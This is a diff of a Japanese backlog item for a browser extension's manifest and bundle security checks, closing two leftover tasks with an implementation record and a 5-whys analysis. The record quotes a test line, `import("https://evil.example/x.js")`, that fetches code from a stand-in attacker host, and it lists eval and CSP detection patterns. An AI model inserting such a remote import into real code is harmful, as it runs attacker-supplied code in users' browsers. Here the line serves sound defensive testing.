@@ -33,7 +33,7 @@ Scenario: バンドルに動的コード実行が混ざると落ちる
 ## 受け入れ基準
 - [x] 両ブラウザの manifest について `permissions` / `optional_permissions` / `host_permissions` / `optional_host_permissions` / `content_scripts.matches` / `web_accessible_resources` / `externally_connectable` を許可リストと完全一致で検査する
 - [x] `content_security_policy.extension_pages` は未指定のままブラウザ既定に任せ、指定された場合に `unsafe-eval` / `unsafe-inline` / `wasm-unsafe-eval` / 外部 origin を含まないことを検査する（明示する案は下記の理由で置き換え）
-- [x] dist の JS に `eval(` / `new Function(` が無いことを検査（誤検知の例外は理由付きで列挙。現状は 0 件）。外部 URL の `import(` は未検査
+- [x] dist の JS に `eval(` / `new Function(` が無いことを検査（誤検知の例外は理由付きで列挙。現状は 0 件）。外部 URL の `import(` も検査する（2026-11-27 追加。下の実装記録）
 - [x] 許可リストの更新には PR テンプレートでストア掲載文・プライバシー文書の更新確認を求める
 
 ## テスト戦略
@@ -45,9 +45,9 @@ Scenario: バンドルに動的コード実行が混ざると落ちる
 0.2人週（要チームでの見積もり）
 
 ## Definition of Done
-- [ ] 全BDDシナリオが自動テストとして実装されパスする
-- [ ] コードレビュー完了
-- [ ] ドキュメント更新済み
+- [x] 全BDDシナリオが自動テストとして実装されパスする
+- [x] コードレビュー完了（Task 2 レビュー Approved。追加分は make check-all で緑を確認。GitHub PR での approve はユーザー作業）
+- [x] ドキュメント更新済み（権限の許可リスト更新時の文書確認は PR テンプレートで担保。変更を要する文書はなかった）
 
 ## 出どころ
 - 2026-11-24 正式版準備の棚卸し。`wxt.config.ts`、`src/entrypoints/content.ts:127`
@@ -61,4 +61,20 @@ Scenario: バンドルに動的コード実行が混ざると落ちる
 - タスクレビュー: spec 適合、Approved（Critical/Important なし）。Minor は `.superpowers/sdd/ga-readiness-task-2-review.md`
 
 ## 引継ぎ
-- 残り 2 点（小）: JS 走査の対象ファイル数が 0 でないことの assert、外部 URL の `import(` 検査。詳細は `docs/superpowers/plans/2026-11-24-ga-readiness-handoff.md`
+- 残り 2 点（小）は 2026-11-27 に実装して閉じた（下の実装記録）。残る作業はない
+
+## 実装記録（2026-11-27、残り 2 点の追加）
+
+- JS 走査の対象ファイル数が 0 でないことの assert: `ships no dynamic code execution` の冒頭で `expect(files.length).toBeGreaterThan(0)` を入れた。dist の構成変更で JS が 1 件も無くなった場合、空走査は自明に通るため、通さず落とす。
+- 外部 URL の `import(` 検査: 新しい `it` として `ships no dynamic import of a remote URL in bundled JS` を追加。`import(` の直後が `https?://` か `//` で始まる文字列リテラルのときに失敗する。実行時に組み立てられる指定子は静的に解決できないため対象外とし、その限界をコメントに書いた。現行の両 dist は `import(` 自体が 0 件のため誤検知なし。
+- 赤確認: chrome-mv3 の background.js に `import("https://evil.example/x.js")` を一時追記して新しい検査が落ちることを確認し、戻した（その後 `make test-build` で dist を再生成）。
+- 検証: `npx vitest run tests/build/manifest-guard.build.ts` 8 件緑。全体は `make check-all` で確認する。
+
+### なぜなぜ分析（残り 2 点が先送りされた理由）
+
+1. なぜ未実装のまま requested を受けたか → 実装指示書（Task 2 の brief）にこの 2 点が書かれていなかった
+2. なぜ brief に無かったか → brief は PBI 本文の受け入れ基準から起こされたが、基準 3 件目の末尾の注記（「外部 URL の import( は未検査」）が「既知の限界の記録」と読め、「やること」と読めなかった
+3. なぜ注記が限界と読めたか → PBI 本文は達成済み項目の説明が主で、未実装の残りが注記の形で本文に埋もれていた
+4. なぜ埋もれたか → 受け入れ基準のチェックボックスには注記を置けないため、達成の対照として本文に書くしかなかった
+5. なぜその書き方になったか → 受け入れ基準の書式（`- [x]` 項目）に「未実装の残り」を載せる欄がなく、引継ぎ節と二重管理になった
+→ 解: 未実装の残りは受け入れ基準の注記に埋めず、引継ぎ節に「やること」として 1 行で列挙する。以降の PBI もこの形に寄せる（本 PBI の引継ぎ節は閉鎖時に処理済みを示す形へ書き換え済み）。
